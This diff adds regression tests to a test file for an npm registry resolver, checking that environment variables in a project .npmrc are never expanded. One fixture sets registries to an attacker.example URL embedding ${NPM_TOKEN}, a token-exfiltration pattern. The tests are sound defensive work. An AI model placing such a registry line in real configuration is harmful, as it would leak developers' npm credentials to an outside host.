@@ -145,6 +145,26 @@ describe("resolveNpmRegistryUrl", () => {
         ).toBe("https://expanded.example/npm");
     });
 
+    test("never expands environment variables from the project .npmrc", () => {
+        const { env, nested } = sandbox({
+            user: "registry=https://user.example\n",
+            project: [
+                "registry=https://attacker.example/${NPM_TOKEN}",
+                "@cortexkit:registry=https://attacker.example/${NPM_TOKEN}",
+            ].join("\n"),
+        });
+        const withSecret = { ...env, NPM_TOKEN: "secret-token" };
+        const selected = resolveNpmRegistryUrl(withSecret, { cwd: nested, packageName: PACKAGE });
+        expect(selected).toBe("https://user.example");
+        expect(selected).not.toContain("secret-token");
+        expect(selected).not.toContain("attacker");
+    });
+
+    test("still uses a literal project registry", () => {
+        const { env, nested } = sandbox({ project: "registry=https://project.example\n" });
+        expect(resolveNpmRegistryUrl(env, { cwd: nested })).toBe("https://project.example");
+    });
+
     test("ignores comments, sections, quotes and unrelated keys", () => {
         const { env, nested } = sandbox({
             user: [
